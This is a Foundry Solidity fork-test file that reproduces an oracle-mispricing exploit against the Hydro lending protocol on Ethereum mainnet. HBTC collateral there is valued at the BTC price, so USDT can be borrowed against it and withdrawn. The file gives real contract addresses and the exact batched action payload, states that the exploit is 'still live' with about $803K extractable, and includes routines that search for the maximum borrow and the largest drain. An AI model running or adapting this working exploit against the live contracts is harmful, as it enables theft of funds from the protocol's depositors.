// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IOracle {
    function getPrice(address) external view returns (uint256);
}

/**
 * Re-confirms the Hydro HBTC oracle depeg exploit at the CURRENT mainnet
 * fork block (~24,910,815, 2026-04-19). The HBTC oracle proxies WBTC's
 * Chainlink BTC/USD feed, so Hydro values 1 HBTC at ~$75.5K while the
 * actual HBTC market value is far lower — the exploit is still live and
 * the available USDT pool sits at ~$803K extractable.
 */
contract HydroHBTCCurrent is Test {
    address constant HYDRO = 0x241e82C79452F51fbfc89Fac6d912e021dB1a3B7;
    address constant HBTC = 0x0316EB71485b0Ab14103307bf65a021042c6d380;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant HBTC_ORACLE = 0x02F5658d34015670AAAac026f4C9c06C7865B26b;
    address constant WBTC_ORACLE = 0x467242Dd4969Df4772A08Eeee3E1A927c22A096D;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant CURVE_HBTC_POOL = 0x4CA9b3063Ec5866A4B82E437059D2C43d1be596F;

    uint16 constant MARKET_HBTC_USDT = 5;

    struct Action {
        uint8 actionType;
        bytes encodedParams;
    }

    bytes4 constant BATCH_SEL = bytes4(keccak256("batch((uint8,bytes)[])"));

    function setUp() public {
        vm.createSelectFork("mainnet");
    }

    function test_oracle_state_today() public view {
        uint256 hbtcPrice = IOracle(HBTC_ORACLE).getPrice(HBTC);
        uint256 wbtcPrice = IOracle(WBTC_ORACLE).getPrice(WBTC);
        uint256 usdtAvail = IERC20(USDT).balanceOf(HYDRO);

        console2.log("HBTC oracle price (raw):", hbtcPrice);
        console2.log("WBTC oracle price (raw):", wbtcPrice);
        // HBTC has 18 decimals, oracle scaled by 10^36 / decimals = 10^18.
        // Actual USD per HBTC ≈ price / 1e18.
        console2.log("HBTC USD per token (Hydro view):", hbtcPrice / 1e18);
        console2.log("USDT pool (USDT units):", usdtAvail / 1e6);
        console2.log("Curve HBTC pool HBTC reserve:", IERC20(HBTC).balanceOf(CURVE_HBTC_POOL));
    }

    function test_exploit_still_live() public {
        address attacker = address(this);
        uint256 hbtcAmount = 1 ether;
        uint256 borrowAmount = 50_000 * 1e6;

        // Stand-in for buying on a DEX: use Curve pool's HBTC.
        // (For an honest cost model the buyer would pay market price for HBTC;
        // we use a transfer here only to obtain the asset for the fork test.)
        vm.prank(CURVE_HBTC_POOL);
        IERC20(HBTC).transfer(attacker, hbtcAmount);

        uint256 usdtBefore = IERC20(USDT).balanceOf(attacker);
        uint256 poolBefore = IERC20(USDT).balanceOf(HYDRO);
        console2.log("=== before ===");
        console2.log("attacker USDT:", usdtBefore / 1e6);
        console2.log("Hydro USDT pool:", poolBefore / 1e6);

        IERC20(HBTC).approve(HYDRO, hbtcAmount);

        Action[] memory actions = new Action[](5);

        actions[0] = Action({
            actionType: 0,
            encodedParams: abi.encode(HBTC, hbtcAmount)
        });

        actions[1] = Action({
            actionType: 2,
            encodedParams: abi.encode(
                HBTC,
                uint8(0), uint16(0), attacker,
                uint8(1), MARKET_HBTC_USDT, attacker,
                hbtcAmount
            )
        });

        actions[2] = Action({
            actionType: 3,
            encodedParams: abi.encode(MARKET_HBTC_USDT, USDT, borrowAmount)
        });

        actions[3] = Action({
            actionType: 2,
            encodedParams: abi.encode(
                USDT,
                uint8(1), MARKET_HBTC_USDT, attacker,
                uint8(0), uint16(0), attacker,
                borrowAmount
            )
        });

        actions[4] = Action({
            actionType: 1,
            encodedParams: abi.encode(USDT, borrowAmount)
        });

        bytes memory payload = abi.encodeWithSelector(BATCH_SEL, actions);
        (bool success, bytes memory ret) = HYDRO.call(payload);
        if (!success) {
            if (ret.length >= 68) {
                bytes memory stripped = new bytes(ret.length - 4);
                for (uint i = 4; i < ret.length; i++) stripped[i-4] = ret[i];
                string memory reason = abi.decode(stripped, (string));
                console2.log("revert reason:", reason);
            }
            revert("batch failed");
        }

        uint256 usdtAfter = IERC20(USDT).balanceOf(attacker);
        uint256 poolAfter = IERC20(USDT).balanceOf(HYDRO);
        uint256 extracted = usdtAfter - usdtBefore;

        console2.log("=== after ===");
        console2.log("attacker USDT:", usdtAfter / 1e6);
        console2.log("Hydro USDT pool:", poolAfter / 1e6);
        console2.log("USDT extracted:", extracted / 1e6);
        console2.log("Pool drained by:", (poolBefore - poolAfter) / 1e6);

        assertGt(extracted, 0);
        assertEq(IERC20(HBTC).balanceOf(attacker), 0);
    }
}

contract HydroHBTCMax is Test {
    address constant HYDRO = 0x241e82C79452F51fbfc89Fac6d912e021dB1a3B7;
    address constant HBTC = 0x0316EB71485b0Ab14103307bf65a021042c6d380;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant CURVE_HBTC_POOL = 0x4CA9b3063Ec5866A4B82E437059D2C43d1be596F;
    uint16 constant MARKET = 5;
    bytes4 constant BATCH_SEL = bytes4(keccak256("batch((uint8,bytes)[])"));

    struct Action { uint8 actionType; bytes encodedParams; }

    function setUp() public { vm.createSelectFork("mainnet"); }

    // Try increasingly large borrows to find the per-HBTC limit
    function test_max_borrow_per_hbtc() public {
        uint256[6] memory tries = [
            uint256(50_000),
            uint256(58_000),
            uint256(60_400),
            uint256(60_458),
            uint256(60_500),
            uint256(61_000)
        ];
        for (uint i = 0; i < 6; i++) {
            _attempt(tries[i] * 1e6);
        }
    }

    function test_max_extraction_global() public {
        // Max HBTC per call must keep collateralValue/debtValue >= withdrawRate (1.25)
        // Scaling linearly: with 1 HBTC -> 60.4K USDT, we'd need ~13.3 HBTC to drain $803K
        // But Curve only has ~1.79 HBTC. Try draining that first.
        uint256 hbtcAmt = 1.5 ether;
        uint256 borrow = 90_000 * 1e6;
        address attacker = address(this);

        vm.prank(CURVE_HBTC_POOL);
        IERC20(HBTC).transfer(attacker, hbtcAmt);
        IERC20(HBTC).approve(HYDRO, type(uint256).max);

        Action[] memory a = new Action[](5);
        a[0] = Action({actionType:0, encodedParams: abi.encode(HBTC, hbtcAmt)});
        a[1] = Action({actionType:2, encodedParams: abi.encode(
            HBTC, uint8(0), uint16(0), attacker, uint8(1), MARKET, attacker, hbtcAmt)});
        a[2] = Action({actionType:3, encodedParams: abi.encode(MARKET, USDT, borrow)});
        a[3] = Action({actionType:2, encodedParams: abi.encode(
            USDT, uint8(1), MARKET, attacker, uint8(0), uint16(0), attacker, borrow)});
        a[4] = Action({actionType:1, encodedParams: abi.encode(USDT, borrow)});

        bytes memory payload = abi.encodeWithSelector(BATCH_SEL, a);
        (bool ok,) = HYDRO.call(payload);
        console2.log("1.5 HBTC / 90K USDT borrow ok?", ok ? 1 : 0);
        if (ok) {
            console2.log("USDT extracted:", IERC20(USDT).balanceOf(attacker) / 1e6);
        }
    }

    function _attempt(uint256 borrow) internal {
        uint256 snap = vm.snapshotState();
        address attacker = address(this);
        vm.prank(CURVE_HBTC_POOL);
        IERC20(HBTC).transfer(attacker, 1 ether);
        IERC20(HBTC).approve(HYDRO, type(uint256).max);

        Action[] memory a = new Action[](5);
        a[0] = Action({actionType:0, encodedParams: abi.encode(HBTC, uint256(1 ether))});
        a[1] = Action({actionType:2, encodedParams: abi.encode(
            HBTC, uint8(0), uint16(0), attacker, uint8(1), MARKET, attacker, uint256(1 ether))});
        a[2] = Action({actionType:3, encodedParams: abi.encode(MARKET, USDT, borrow)});
        a[3] = Action({actionType:2, encodedParams: abi.encode(
            USDT, uint8(1), MARKET, attacker, uint8(0), uint16(0), attacker, borrow)});
        a[4] = Action({actionType:1, encodedParams: abi.encode(USDT, borrow)});

        bytes memory payload = abi.encodeWithSelector(BATCH_SEL, a);
        (bool ok,) = HYDRO.call(payload);
        console2.log("borrow request (USDT):", borrow / 1e6, "  ok?", ok ? 1 : 0);
        vm.revertToState(snap);
    }
}
